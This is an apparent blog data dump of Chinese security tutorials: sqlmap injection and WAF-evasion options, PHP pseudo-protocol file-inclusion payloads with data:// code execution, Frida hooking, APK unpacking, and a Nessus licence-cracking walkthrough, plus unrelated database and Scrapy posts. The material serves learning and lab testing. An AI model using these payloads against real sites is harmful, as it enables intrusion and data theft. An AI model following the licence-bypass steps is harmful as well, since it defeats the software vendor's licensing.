&quot;http://127.0.0.1/Less-1/?id=1&quot; --cookie &quot;id=1&quot; --level 2#当程序有防get注入的时候，使用cookie注入。（只有level2以上才会检测cookie）sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test --tables#查询test数据库下有哪些表sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test -T admin --columns#查询test数据库、admin表有哪些字段 一些注意点 level level是注入测试等级，级别越高，检测的内容也就越多。检测级别大于等于2的时候会检测cookie的注入，检测级别大于等于3的时候会检测User-Agent和Referer是否有注入。 risk参数是风险等级，等级越高，风险越大。比如risk为3的时候，会增加 or 语句的SQL注入测试。这时候如果加入了update，就有可能导致更新整个表。 *指定注入点 sqlmap可以自动找到URL里的参数，从而确定注入点。但在遇到一些做了伪静态的网页就无法自动识别。 /admin/1/类似这种，SQLMap就无法进行注入测试，但它实际上可能是这样的：/admin.php?id=1,它是把参数隐藏在了URL中，对于这样URL，直接在参数后面加一个*就可以： 1sqlmap -u &quot;www.baidu.com/admin/1*&quot; POST数据 在 URL后跟上你要提交的POST数据，SQLMap 也会去自动测试。 1sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --data=&quot;id=1&amp;name=admin&quot; 从文件载入HTTP请求测试 使用参数：-r 可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。 可以从 burpsuite 上抓包下来配合 SQLMap 进行联合使用。 Google搜索进行测试 注入测试的脚本 使用参数：-tamper WAF的存在，会有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 而SQLMap自带了一个脚本库（在tamper目录下），内置的脚本库对 payload 进行了混淆，使得可以有效地规避防火墙规则","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"web安全之伪协议","slug":"web安全之伪协议","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-31T08:02:46.568Z","comments":true,"path":"2020/08/31/web安全之伪协议/","link":"","permalink":"http://yejuns.github.io/2020/08/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"伪协议file伪协议，通过这个协议可以对系统中的文件进行包含， 条件: allow_url_fopen:off/on allow_url_include :off/on 示例： file://[文件的绝对路径和文件名]1http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt [文件的相对路径和文件名]1http://127.0.0.1/include.php?file=./phpinfo.txt [http：//网络路径和文件名]1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt php伪协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams）， 经常使用的是 php://filter 和 php://input，php://filter用于读取源码，php://input用于执行php代码。 zip:// &amp; bzip2:// &amp; zlib:// 协议 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等 示例 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt phar:// 协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt data:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 示例 data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 常规 URL形式，允许通过HTTP 1.0的 GET方法，以只读访问文件或资源。通常用于远程包含。 示例 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之伪协议与文件包含","slug":"web安全之文件包含","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-31T05:33:59.450Z","comments":true,"path":"2020/08/31/web安全之文件包含/","link":"","permalink":"http://yejuns.github.io/2020/08/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"文件包含程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞 php中常见的文件包含函数，include(), include_once() , require_once() , fopen() , readfile() 本地包含:可以进行一些本地的文件读取 12345&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename);?&gt;# 如上述例子 在引用filename函数时,没有过滤，直接引用了这个函数,如果fileName这个文件是一句话木马，就会被执行 如果导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的 远程包含:可以对远程的文件进行读取 这时候，如果攻击者先构建了一个恶意的文件，然后使借助远程包含，就可以使得攻击者包含这个文件，从而发起攻击。 （要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态，这就要引入伪协议的概念） 伪协议","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Android逆向第五课 - frida （上）","slug":"Android逆向第五课","date":"2020-07-11T11:01:51.000Z","updated":"2021-07-31T11:20:20.017Z","comments":true,"path":"2020/07/11/Android逆向第五课/","link":"","permalink":"http://yejuns.github.io/2020/07/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%BA%94%E8%AF%BE/","excerpt":"","text":"Frida是一款轻量级HOOK框架，可用于多平台上，例如android、windows、ios等。 frida分为两部分，服务端运行在目标机上，通过注入进程的方式来实现劫持应用函数，另一部分运行在系统机器上。 frida上层接口支持js、python、c等。 1. frida安装frida 的项目地址为：https://github.com/frida 1.1 client端安装本地客户端是基于Python的，首先安装python环境，然后使用 pip install frida, 为了方便使用，我们还需要安装 frida-tool，命令类似 1.2 server端安装远程端需要有一个服务端用来接收我们发过去的js代码，即frida-server，下载地址，我们需要下载的也是 frida-server-,不要下错了。 注意：下载的时候要区分 cpu 架构，windows模拟器要用 x86 的客户端，而且一般都是32位 下载完成后，我们使用 adb 将文件传输到模拟器中，我这里发现使用命令 adb shell 会报错， 12adb server version (36) doesn&#x27;t match this client (41); killing...* daemon started successfully 原来是夜神模拟器自带了一个adb，需要用它的adb去连接模拟器，adb所在位置就是夜神模拟器的安装位置,在这个目录下执行 nox_adb shell ,就可以正常进入模拟器的shell。 安装 frida-server 的流程是： 首先，nox_adb push frida-server-12.6.8-android-x86 /data/local/tmp/ 然后，nox_adb shell 增加可执行权限，chmod 777 frida-server-12.6.8-android-x86 运行frida，./frida-server-12.6.8-android-x86 这时候，基本上frida就成功运行了，因为我们的主机上装了frida的客户端，在主机上使用命令 frida-ps -U，就可以看到hook到的一些信息 2. frida原理frida是一种动态插桩工具，可以插入一些代码到原生app的内存空间去，（动态地监视和修改其行为）。 插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种 源代码插桩[Source Code Instrumentation(SCI)]：顾名思义，在程序源代码的基础上增加（注入）额外的代码 二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中，通过修改汇编地址，改变程序运行内容，运行后再返回到原来程序运行出处，从而实现程序的额外功能 静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件 动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变 3.frida使用最简单的使用方法如下： 12345678import fridaimport sys#获取设备信息rdev = frida.get_remote_device()#获取在前台运行的APPfront_app = rdev.get_frontmost_application()print (front_app) 3.1 Hook Java层 我们写一个demo，就是点击按钮显示 “source string”, 然后借助 frida 去 hook 显示 string 的代码，将显示的字符串更改为 “Change String!” 编写hook代码 123456789101112131415161718192021import frida #导入frida模块import sys #导入sys模块jscode = &quot;&quot;&quot; #从此处开始定义用来Hook的javascript代码 Java.perform(function()&#123; var MainActivity = Java.use(&#x27;com.example.testfrida.MainActivity&#x27;); //获得MainActivity类 MainActivity.testFrida.implementation = function()&#123; //Hook testFrida函数，用js自己实现 send(&#x27;Statr! Hook!&#x27;); //发送信息，用于回调python中的函数 return &#x27;Change String!&#x27; //劫持返回值，修改为我们想要返回的字符串 &#125; &#125;);&quot;&quot;&quot;def on_message(message,data): #js中执行send函数后要回调的函数 print(message)process = frida.get_remote_device().attach(&#x27;com.example.testfrida&#x27;) #得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）script = process.create_script(jscode) #创建js脚本script.on(&#x27;message&#x27;,on_message) #加载回调函数，也就是js中执行send函数规定要执行的python函数script.load() #加载脚本sys.stdin.read() #获取输入流 --》防止程序直接退出 执行首先手机端执行frida，然后通过命令adb forward tcp:27043 tcp:27043 和 adb forward tcp:27042 tcp:27042来转发这两个端口，接着在手机上运行该应用程序，然后执行python脚本，最后点击应用的按钮，即可看到字符串已经被替换成我们要替换的了 3.2 Hook native层hook native 层的方法与hook java层的方法流程类似，只是需要记住几个方法 1234567891011121314var pointer = Module.findExportByName(&quot;hello.so&quot;, &quot;printhello&quot;); // 返回 `hello.so` 里的 `printhello` 方法的地址var base_address = Module.findBaseAddress(&quot;hello.so&quot;)； // 返回 `hello.so` 的基准地址var lib_module = Process.findModuleByAddress(base_address); // 获取 base_address 中的内容,即对应的对象Interceptor.attach(mod_address,&#123; onEnter: fucntion(args)&#123; &#125;, onLeave: function()&#123; &#125;&#125;)// 劫持 pointer 方法，也就是 `hello.so` 里的 `printhello` 方法，在执行该方法时先调用 onEnter 中的方法Memory.readUtf8String(); //把内存里的值转成字符串 参考文献 https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/https://www.52pojie.cn/thread-1128884-1-1.html","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"爬虫之Scrapy","slug":"爬虫之Scrapy","date":"2020-06-21T08:01:51.000Z","updated":"2021-07-18T15:25:08.377Z","comments":true,"path":"2020/06/21/爬虫之Scrapy/","link":"","permalink":"http://yejuns.github.io/2020/06/21/%E7%88%AC%E8%99%AB%E4%B9%8BScrapy/","excerpt":"","text":"Scrapy 是一个基于Twisted的异步处理框架，是纯 Python 实现的爬虫框架，其架构清晰，模块之间的耦合程度低，可扩展性极强，可以灵活完成各种需求。而且它属于一种全家桶式的框架，在架构上很特别，都是基于插件式的增量开发模式，并行运行能力非常出众。 1、Scrapy的安装 Linux平台上直接pip install scrapy Windows平台上需要先安装Twisted。首先下载Twisted的whl包，下载地址,选择和你的windows系统一致的版本，然后进入下载的目录，执行以下指令 D:\\tmp&gt; pip install .\\Twisted-20.3.0-cp39-cp39-win32.whl 安装完成后，就可以执行pip install scrapy。 完成安装后在命令行执行，scrapy -h,如果能正常输出scrapy的命令帮助信息则表明安装成功. 如果安装完成后在运行scrapy项目时报以下的错 no module named win32api 则表示Windows系统中，python因为原生并不能访问windows的api，所以需要额外安装pypiwin32库,pip install pypiwin32 2、scrapy 项目结构scrapy 的项目对目录结构有严格要求，为了简化这个构建指定目录的重复性过程，我们可以使用scrapy内置的startproject指令来快速构建scrapy项目。比如，我们创建第一个爬虫项目test1 scrapy startproject test1 项目生成后，展开”test1”目录可以看到以下的目录结构： 12345678910test1├── test1 # 爬虫项目包目录│ ├── __init__.py│ ├── items.py # Item定义文件│ ├── middlewares.py # 自定义中间件│ ├── pipelines.py # 自定义管道│ ├── settings.py # 项目配置文件│ └── spiders # 蜘蛛类的存放目录│ └── __init__.py└── scrapy.cfg # Scrapy 运行配置文件 常用指令Scrapy 提供的全局命令(只能在 Scrapy 项目目录之外运行)主要包括以下这些: scrapy startproject &lt;项目名&gt; - 初始化爬虫项目，创建基本目录与必要的文件 scrapy runspider &lt;spider_file.py&gt; - 在未创建项目的情况下，运行一个编写在Python文件中的spider scrapy fetch - 使用Scrapy下载器(downloader)下载给定的URL，并将获取到的内容打印到控制台上 scrapy view - 在浏览器中打开给定的URL，并用一个Scrapy spider获取目标URL，并将结构显示到浏览器中。 Scrapy 提供的项目（Project-only）命令是必须先进入项目目录后才能使用的命令: scrapy crawl &lt;蜘蛛名&gt; - 使用指定的蜘蛛执行爬取 scrapy genspider - 在当前项目中创建spider。这仅仅是创建spider的一种快捷方法。该方法可以使用提前定义好的模板来生成spider。 scrapy bench - 运行benchmark测试 scrapy deploy [ target:project | -l | -L ] - 将项目部署到Scrapyd服务 genspider 指令是最为常用的，顾名思义它就是用来帮助我们生成蜘蛛代码框架构。 它的指令结构如下: scrapy genspider [-t 模板名] &lt;蜘蛛名&gt; &lt;域&gt; 模板名参数提供以下4种常用的蜘蛛模板： basic - 默认，创建基本的蜘蛛 crawl - 创建基于CrawlSpider 的蜘蛛 csvfeed - 创建基于CsvFeedSpider 的蜘蛛 xmlfeed - 创建基于XmlFeedSpider 的蜘蛛 创建一个爬取新浪新闻的普通蜘蛛: 1scrapy genspider news http:&#x2F;&#x2F;www.sina.com 当指令执行成功后就会在 [项目名]/[项目名]/spiders/ 目录下找到一个news.py 的蜘蛛源码文件 打开new.py 12345678# -*- coding: utf-8 -*-import scrapyclass NewsSpider(scrapy.Spider): # 生成蜘蛛后Scrapy会将蜘蛛名首字母大写并在其后加Spider作为蜘蛛的类名 name = &#x27;news&#x27; # 蜘蛛名 allowed_domains = [&#x27;http://www.sina.com&#x27;] # 在genspider指定的域 start_urls = [&#x27;http://http://www.sina.com/&#x27;] def parse(self, response): pass","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"MergeTree解析","slug":"MergeTree解析","date":"2020-06-20T08:01:51.000Z","updated":"2021-07-23T07:29:00.363Z","comments":true,"path":"2020/06/20/MergeTree解析/","link":"","permalink":"http://yejuns.github.io/2020/06/20/MergeTree%E8%A7%A3%E6%9E%90/","excerpt":"","text":"1. 简介MergeTree是面向列的表引擎，其建立在类似于Log Structured Merge Tree 的数据结构上. MergeTree 属性 每列的数据分别存储。由于不需要在读取和跳过其他列的数据上花费资源，因此减少了列扫描期间的开销。由于各个列通常包含相似的数据，因此这也提高了每列的压缩率。 行按&quot;主键&quot;排序，该主键可以包含多列。主键没有唯一的约束–多行可能具有相同的主键。这样可以通过主键或其前缀快速进行行查找和范围扫描。另外，由于连续排序的行通常包含相似的数据，因此可以提高压缩率。 行被分成中等大小的块。每个块由每个列的子块组成。每个块都是独立处理的。这意味着在多CPU系统上具有接近完美的可扩展性–只需为所有可用的CPU内核提供独立的块即可。可以配置块大小，但是建议使用大小在64KB-2MB之间的子块，因此它们适合CPU缓存。由于CPU缓存访问比RAM访问快得多，因此可以提高性能。另外，当必须从具有多行的块中仅访问几行时，这会减少开销。 块合并为&quot;parts&quot;。这些parts类似于LSM树中的SSTables。 ClickHouse在后台将较小的parts合并为较大的parts。与规范的LSM不同，MergeTree没有严格的part大小。合并过程提高了查询性能，因为每次查询都检查了较少的parts。另外，合并过程减少了数据文件的数量，因为每个部分都包含与列数成比例的固定数量的文件。Parts合并还有另一个好处–更好的压缩率，因为它可以移动更接近已排序行的列数据 Parts通过&quot;分区&quot;分组到分区中。最初，ClickHouse允许在”Date”列上创建每月分区。现在，可以使用任意表达式来构建分区键。分区键的不同值导致不同的分区。这样可以快速方便地按分区进行数据存档/删除。 2. 实践clickhouse中的MergeTree表引擎 参考文档 https://segmentfault.com/a/1190000023089140","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://yejuns.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"LSM树解析","slug":"LSM树解析","date":"2020-06-10T08:01:51.000Z","updated":"2021-07-23T07:33:25.967Z","comments":true,"path":"2020/06/10/LSM树解析/","link":"","permalink":"http://yejuns.github.io/2020/06/10/LSM%E6%A0%91%E8%A7%A3%E6%9E%90/","excerpt":"","text":"1. 简介LSM树（Log Structured Merge Tree）将磁盘的随机写转化为顺序写来提高写性能, 相比 B+ 树能提高写性能的本质原因是：外存——无论磁盘还是 SSD，其随机读写都要慢于顺序读写。 LSM树（Log Structured Merge Tree，结构化合并树）的思想非常朴素，就是将对数据的修改增量保持在内存中，达到指定的大小限制后将这些修改操作批量写入磁盘（由此提升了写性能），是一种基于硬盘的数据结构，与B-tree相比，能显著地减少硬盘磁盘臂的开销。 读取时需要合并磁盘中的历史数据和内存中最近的修改操作,读取先看是否命中内存，否则需要访问较多的磁盘文件（存储在磁盘中的是许多小批量数据，由此降低了部分读性能。但是磁盘中会定期做merge操作，合并成一棵大树，以优化读性能）。LSM树的优势在于有效地规避了磁盘随机写入问题，但读取时可能需要访问较多的磁盘文件。 代表数据库：nessDB、leveldb、hbase等 2.背景知识假如我们存储数据时，对写操作的吞吐量敏感，最简单的办法是的将数据添加到文件。这个策略经常被使用在日志或者堆文件，因为他们是完全顺序的，所以可以提供非常好的写操作性能，大约等于磁盘的理论速度，也就是200~300 MB/s。 因为简单和高效，基于日志的策略在大数据之间越来越流行，同时他们也有一些缺点，从日志文件中读一些数据将会比写操作需要更多的时间，需要倒序扫描，直接找到所需的内容。 这说明日志仅仅适用于一些简单的场景： 数据是被整体访问，像大部分数据库的 WAL(write-ahead log) 知道明确的offset，比如在 Kafka 中。 3. LSM 算法从概念上说，最基本的LSM就是将之前使用的一个大的查找结构（造成随机读写，影响写性能），变换为将写操作顺序的保存到一些相似的有序文件（也就是 sstable )中。所以每个文件包含短时间内的一些改动。因为文件是有序的，所以之后的查找也会很快。文件是不可修改的，更新操作只会写到新的文件中。 当一些更新操作到达时，和写入一个 k-v 数据没有什么不同，只是在读取的时候，会从 Level0 层的 SSTable 文件开始查找数据，数据在低层的 SSTable 文件中必然比高层的文件中要新，所以总能读取到最新的那条数据。也就是说此时在整个 LSM Tree 中可能会同时存在多个 key 值相同的数据，只有在之后合并 SSTable 文件的时候，才会将旧的值删除 当一个读操作请求时，系统首先检查内存数据(memtable)，如果没有找到这个key，就会逆序的一个一个检查sstable文件，直到 key 被找到。因为每个sstable都是有序的，所以查找比较高效，复杂度是(O(logN))，但是随着sstable的个数增加读操作会变的越来越慢，因为每一个 sstable 都要被检查。 为了保持LSM的读操作相对较快，维护并减少sstable文件的个数是很重要，这就是合并操作。 比如有5个sstable，每一个有10行，他们被合并为一个50行的文件（或者更少的行数）。这个过程一直持续着，当更多的有10行的sstable文件被创建，当产生5个文件时，它们就被合并到50行的文件。最终会有5个50行的文件，这时会将这5个50行的文件合并成一个250行的文件。这个merge过程会一直持续。 4. 名次解释 WAL（Write-ahead logging 预写式日志） 当插入一条数据时，数据先顺序写入 WAL 文件中，之后插入到内存中的 MemTable 中。这样就保证了数据的持久化，不会丢失数据，并且都是顺序写，速度很快。当程序挂掉重启时，可以从 WAL 文件中重新恢复内存中的 MemTable MemTable MemTable 对应的就是 WAL 文件在内存中的存储结构，通常用 SkipList 来实现。MemTable 提供了 k-v 数据的写入、删除以及读取的操作接口。其内部将 k-v 对按照 key 值有序存储，这样方便之后快速序列化到 SSTable 文件中，仍然保持数据的有序性 Immutable Immutable 就是在内存中只读的 MemTable，由于内存是有限的，通常我们会设置一个阀值，当 MemTable 占用的内存达到阀值后就自动转换为 Immutable，Immutable 和 MemTable 的区别就是它是只读的，系统此时会生成新的 MemTable 供写操作继续写入。 之所以要使用 Immutable，就是为了避免将 MemTable 中的内容序列化到磁盘中时会阻塞写操作。 sstable（就是一个简单而有用的数据结构） SSTable 就是 MemTable 中的数据在磁盘上的有序存储，其内部数据是根据 key 从小到大排列的。通常为了加快查找的速度，需要在 SSTable 中加入数据索引，可以快读定位到指定的 k-v 数据。 SSTable 通常采用的分级的结构，例如 LevelDB 中就是如此。MemTable 中的数据达到指定阀值后会在 Level 0 层创建一个新的 SSTable。当某个 Level 下的文件数超过一定值后，就会将这个 Level 下的一个 SSTable 文件和更高一级的 SSTable 文件合并，由于 SSTable 中的 k-v 数据都是有序的，相当于是一个多路归并排序，所以合并操作相当快速，最终生成一个新的 SSTable 文件，将旧的文件删除，这样就完成了一次合并过程。 Compaction 当数据不断从 Immutable Memtable 序列化到磁盘上的 SSTable 文件中时，SSTable 文件的数量就不断增加，而且其中可能有很多更新和删除操作并不立即对文件进行操作，而只是存储一个操作记录，这就造成了整个 LSM Tree 中可能有大量相同 key 值的数据，占据了磁盘空间。为了节省磁盘空间占用，控制 SSTable 文件数量，需要将多个 SSTable 文件进行合并，生成一个新的 SSTable 文件 参考文档 https://www.open-open.com/lib/view/open1424916275249.htmlhttp://blog.fatedier.com/2016/06/15/learn-lsm-tree/","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://yejuns.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"Android逆向第四课-脱壳","slug":"Android逆向第四课","date":"2020-05-11T11:01:51.000Z","updated":"2021-07-24T12:59:17.458Z","comments":true,"path":"2020/05/11/Android逆向第四课/","link":"","permalink":"http://yejuns.github.io/2020/05/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%9B%9B%E8%AF%BE/","excerpt":"","text":"1. 简单实践对于一个APK，我们首先需要判断其是否被加固，最简单的做法就是将 .apk 文件改成 .zip 文件，然后进行解压。如果进行了加固，一般在 /lib 目录下会有相关的 .so 文件，比如 libshellx-2.10.6.0.so(腾讯)、libnesec.so（网易）。 （如果实在不确定，可以搜索 lib 目录下的所有 .so 文件信息，如果是进行加固的文件，一定可以检索到相关信息） 不同厂商对APP的加固特征 爱加密：libexec.so,libexecmain.so，ijiami.dat 梆梆： libsecexe.so,libsecmain.so, libDexHelper.so libSecShell.so 360：libprotectClass.so,libjiagu.so，libjiagu_art.so，libjiagu_x86.so 百度：libbaiduprotect.so 腾讯：libshellx-2.10.6.0.so，libBugly.so，libtup.so, libexec.so，libshell.so stub_tengxun 我这里随便选择了一个 test.apk，使用 apktool 对apk文件进行反编译，打开 Manifist 文件, 我们可以发现，入口方法已经变成了com.tencent.StubShell.TxAppEntry，因为 app 加壳后，入口方法就变成了最外面壳中的方法，然后这个方法载入原 app 实际运行的方法，实际的入口方法是 com.iCitySuzhou.suzhou001.MyApplication 12&lt;application ... android:name=&quot;com.tencent.StubShell.TxAppEntry&quot; android:theme=&quot;@style/AppTheme&quot;&gt; &lt;meta-data android:name=&quot;TxAppEntry&quot; android:value=&quot;com.iCitySuzhou.suzhou001.MyApplication&quot;/&gt; 我们使用jadx打开 test.apk，找到class TxAppEntry, 里面会有一个 attachBaseContent 方法，这个方法很重要，就是把 原App 载入内存中。 2. Dex文件加固原理Dex文件整体加固原理如下: 在该过程中涉及到三个对象，分别是 源程序 源程序也就是我们的要加固的对象，这里面主要修改的是原apk文件中的classes.dex文件和AndroidManifest.xml文件。 壳程序 壳程序主要用于解密经过加密了的dex文件，并加载解密后的原dex文件，并正常启动原程序 加密程序 加密程序主要是对原dex文件进行加密，加密算法可以是简单的异或操作、反转、rc4、des、rsa等加密算法。 3. Dex文件脱壳原理在壳APK解密源APK后，源APK被加载前，拦截这个过程中的系统函数 把内存中的Dex文件dump出来 3.1 手动脱壳通过动态调试，跟踪计算Dex源文件的内存偏移地址，从内存中Dump出Dex文件，难度大，寄存器，汇编，反调试，反读写 使用工具：IDA 3.1 工具脱壳HOOK技术/内存特征寻找，简单易操作 基于 xposed 脱壳工具：（应用层 java） Fdex2：Hook ClassLoader loadClass方法 通用脱壳 dumpDex：https://github.com/WrBug/dumpDex 重写底层函数：（native层 .so）DexExtractor：重写libdvm.so、dexFileParse函数。 常用逆向框架： xposed（Java 编译） frida（Python Javascript 代码注入） 主要系统函数都已HOOK/基于xposed frida开发脱壳工具/有大神已开发上层应用模块","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"时序数据库简介","slug":"时序数据库简介","date":"2020-05-11T08:01:51.000Z","updated":"2021-07-23T07:59:43.931Z","comments":true,"path":"2020/05/11/时序数据库简介/","link":"","permalink":"http://yejuns.github.io/2020/05/11/%E6%97%B6%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B/","excerpt":"","text":"1. 什么是时序数据库时序数据库（Time Series Database，简称 TSDB）就是存放时序数据的数据库，并且支持时序数据的快速写入、持久化、多纬度的聚合查询等基本功能。 什么是时序数据? 时序数据是基于时间的一系列的数据。在有时间的坐标中将这些数据点连成线，往过去看可以做成多纬度报表，揭示其趋势性、规律性、异常性；往未来看可以做大数据分析，机器学习，实现预测和预警。 当你使用sensor收集实时数据时，是覆盖以往的读数，还是在新的一行创建全新的读数？尽管这两种方法都能为你提供系统的当前状态，但只有第二种方法才能跟踪系统的所有状态简而言之：时间序列数据集跟踪整个系统的改动并不断插入新数据，而不是更新原有数据 2. 为什么不用常规数据库完成这些功能 规模 时间序列数据累计速度非常快。（例如，一辆联网汽车每小时能收集 25GB 数据。）常规数据库在设计之初并非处理这种规模的数据，关系型数据库处理大数据集的效果非常糟糕。相比之下，时间序列数据库（可以基于关系型数据库或 NoSQL 数据库）将时间视作一等公民，通过提高效率来处理这种大规模数据，并带来性能的提升，包括：更高的容纳率（Ingest Rates）、更快的大规模查询（尽管有一些比其他数据库支持更多的查询）以及更好的数据压缩。 可用性 TSDB 通常还包括一些共通的对时间序列数据分析的功能和操作：数据保留策略、连续查询、灵活的时间聚合等 3. TSDB中的一些概念我们以influxdb为例 Measurement: ，相当于关系型数据库中的table。 data point: 数据点，相当于关系型数据库中的row。 timestamp：时间戳，代表数据点产生的时间。 field: 度量下的不同字段。比如位置这个度量具有经度和纬度两个field。一般情况下存放的是会随着时间戳的变化而变化的数据。不能用于建立索引 tag: 标签，或者附加信息。一般存放的是并不随着时间戳变化的属性信息。timestamp加上所有的tags可以认为是table的primary key。可用于建立索引 从CSDN上找到一张图，： 4. 数据写入的特点 写入平稳、持续、高并发高吞吐：时序数据的写入是比较平稳的，这点与应用数据不同，应用数据通常与应用的访问量成正比，而应用的访问量通常存在波峰波谷。时序数据的产生通常是以一个固定的时间频率产生，不会受其他因素的制约，其数据生成的速度是相对比较平稳的。 写多读少：时序数据上95%-99%的操作都是写操作，是典型的写多读少的数据。这与其数据特性相关，例如监控数据，你的监控项可能很多，但是你真正去读的可能比较少，通常只会关心几个特定的关键指标或者在特定的场景下才会去读数据。 实时写入最近生成的数据，无更新：时序数据的写入是实时的，且每次写入都是最近生成的数据，这与其数据生成的特点相关，因为其数据生成是随着时间推进的，而新生成的数据会实时的进行写入。数据写入无更新，在时间这个维度上，随着时间的推进，每次数据都是新数据，不会存在旧数据的更新，不过不排除人为的对数据做订正。","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://yejuns.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"Nessus使用","slug":"Nessus使用","date":"2020-05-11T06:01:51.000Z","updated":"2021-07-10T10:20:05.737Z","comments":true,"path":"2020/05/11/Nessus使用/","link":"","permalink":"http://yejuns.github.io/2020/05/11/Nessus%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Nessus安装、破解Nessus号称是世界上最流行的漏洞扫描程序，可以用来做主机扫描，但由于试用版只能扫16个IP，于是我们这里要去破解一下。 下载安装下载地址：https://www.tenable.com/downloads/nessus?loginAttempted=true 直接根据自己的系统版本下载就行，我这里下的是X64.msi,然后安装就可以 安装完成后，在浏览器中输入：https://localhost:8834，打开Nessus进行初始化 第一步选择：Managed Scanner 第二步选择：Tenable.sc 接下来我们创建登录用户名和密码，然后等待进入系统，此时，除了系统版本，右侧内容均为空白，接下来的步骤就是依次补充各方面内容 安装liscence 和 Plugin_Set压缩包 在Nessus的安装目录下运行 .\\nessuscli.exe fetch --challenge,会得到challenge code 访问 https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true, 注册获取activation code 访问 https://plugins.nessus.org/v2/offline.php ，填写我们得到的code，页面会进行跳转，然后我们下载文件nessus.license和all-2.0.tar.gz 把下载的文件放在Nessus的安装目录下，在Nussus的安装目录下运行 12.\\nessuscli.exe update .\\all-2.0.tar.gz.\\nessuscli.exe fetch --register-offline .\\nessus.license 然后重启Nessus 123# wondows 下重启服务net stop &quot;Tenable Nessus&quot; net start &quot;Tenable Nessus&quot; 最后再次访问https://localhost:8834/#/, 会显示正在重新编译。等编译成功后，就可以发现主页上已经有了sacn的功能 破解 Nessus将扫描插件存放在D:\\tool\\Nessus\\nessus\\plugins, 后面破解会重置这个文件夹，所以我们先提前将里面已经编译好的插件备份出来; 